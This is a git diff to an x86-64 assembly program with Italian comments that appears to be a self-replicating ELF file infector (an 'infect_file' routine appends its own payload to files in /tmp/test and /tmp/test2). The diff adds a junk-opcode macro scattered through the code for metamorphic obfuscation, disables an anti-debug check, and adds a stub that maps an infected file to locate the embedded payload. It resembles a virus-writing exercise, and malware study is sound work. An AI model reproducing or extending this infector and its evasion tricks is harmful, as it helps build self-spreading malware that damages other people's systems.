@@ -21,6 +21,25 @@
 ; | str dir1  |    16 |
 ; '-----------'-------'
 
+%define START_JUNK1 0x41
+%define START_JUNK2 0x57
+%define PUSH 0x50
+%define ADD 0x83
+%define ADD1 0xc0
+%define ADD2 0xa
+%define SUB 0x83
+%define SUB1 0xe8
+%define SUB2 0x1
+%define XCHG 0x87
+%define XCHG1 0xc0
+%define POP 0x58
+%define END_JUNK1 0x41
+%define END_JUNK2 0x5f
+
+%macro JUNK 0
+    db START_JUNK1, START_JUNK2, PUSH, ADD, ADD1, ADD2, SUB, SUB1, SUB2, XCHG, XCHG1, POP, END_JUNK1, END_JUNK2
+%endmacro
+
 section .text
     global _start
 
@@ -65,17 +84,22 @@ _start:
     mov rbp, rsp                            ; salvo stato attuale stack
 
     ; ----------------------- Anti-Debug -----------------------
-    call check_debug
-    cmp rax, 0
-    je .pass_first_check
-
-    mov rdi, 1
-    lea rsi, [rel msg_debug]
-    mov rdx, 12
-    mov rax, 1
-    syscall                                ; write(1, "DEBUGGING..\n", 12)
-
-    jmp exit
+    JUNK
+;    call check_debug
+;    cmp rax, 0
+;    je .pass_first_check
+;
+;    JUNK
+;
+;    mov rdi, 1
+;    lea rsi, [rel msg_debug]
+;    mov rdx, 12
+;    mov rax, 1
+;    syscall                                ; write(1, "DEBUGGING..\n", 12)
+;
+;    JUNK
+;
+;    jmp exit
 
     .pass_first_check:
     ; --------- Controllo se il processo cat è attivo ----------
@@ -85,11 +109,15 @@ _start:
     jne exit
     ; ----------------------------------------------------------
 
+    JUNK
+
     .pass_second_check:
     sub rsp, 16                             ; riservo spazio per /tmp/test
     mov dword [rsp+8], `t/\0\0`
     mov dword [rsp+4], '/tes'
     mov dword [rsp], '/tmp'
+
+    JUNK
 
     sub rsp, 16                             ; riservo spazio per /tmp/test2
     mov dword [rsp+8], `t2/\0`
@@ -99,6 +127,10 @@ _start:
     mov rdi, rsp
     add rdi, 16                             ; passo come argomento /tmp/test/
     call chdir                              ; chdir
+    cmp rax, 0
+    jl exit
+
+    JUNK
 
     mov rsi, 0
     call open                               ; open /tmp/test/
@@ -106,14 +138,20 @@ _start:
     jl exit
     push rax                                ; salvo nello stack fd cartella
 
+    JUNK
+
     sub rsp, 32768                          ; riservo spazio nello stack per lettura getdents64
     mov rsi, rsp                            ; passo come argomento lo spazio riservato
     mov rdi, [rsp+32768]
     call getdents64
     push rax                                ; salvo nello stack totale letto da getdents64
 
+    JUNK
+
     mov rdi, [rsp+32768+8]
     call closefd                            ; chiudo fd cartella
+
+    JUNK
 
     sub rsp, 4096                           ; riservo spazio per stat
     mov r10, rsp                            ; r10 = puntatore stat
@@ -121,10 +159,16 @@ _start:
     add rdi, 4104                           ; rdi = puntatore struct
     call loop_indir
 
+    JUNK
+
     ;test2
     mov rdi, rsp
     add rdi, 36880                          ; passo come argomento /tmp/test2/
     call chdir                              ; chdir
+    cmp rax, 0
+    jl exit
+
+    JUNK
 
     mov rsi, 0
     call open                               ; open
@@ -132,11 +176,15 @@ _start:
     jl exit
     mov [rsp+4096+8+32768], rax             ; salvo fd
 
+    JUNK
+
     mov rdi, [rsp+4096+8+32768]             ; rdi = fd
     mov rsi, rsp
     add rsi, 4104                           ; rsi = spazio riservato
     call getdents64                         ; getdents64
     mov [rsp+4096], rax                     ; salvo quantità letta
+
+    JUNK
 
     mov rdi, [rsp+4096+8+32768]             ; fd da chiudere
     call closefd                            ; close
@@ -145,6 +193,8 @@ _start:
     mov rdi, rsp
     add rdi, 4104                           ; rdi = dati letti da getdents64
     call loop_indir
+
+    JUNK
 
     jmp exit
 
@@ -362,6 +412,27 @@ infect_file:                                ; rdi = ptr nome file
         mov rax, 1
         syscall                             ; write
         pop rax
+
+    .metamorph:
+        mov rdi, [rsp+36920]
+        xor rsi, rsi
+        mov rdx, 2                          ; SEEK_END
+        call lseek
+
+        mov rsi, rax
+        mov r8, [rsp+36920]
+        call mmap
+        add rax, rsi                        ; aggiungo al puntatore la dimensione del file
+        lea rcx, [rel end_offset]
+        lea rsi, [rel _start]
+        sub rcx, rsi
+        sub rax, rcx                        ; sottraggo al puntatore la dimensione del payload
+
+        mov rsi, [rax]
+        mov rax, 1
+        mov rdi, 1
+        mov rdx, 6
+        syscall
 
         jmp .end
 
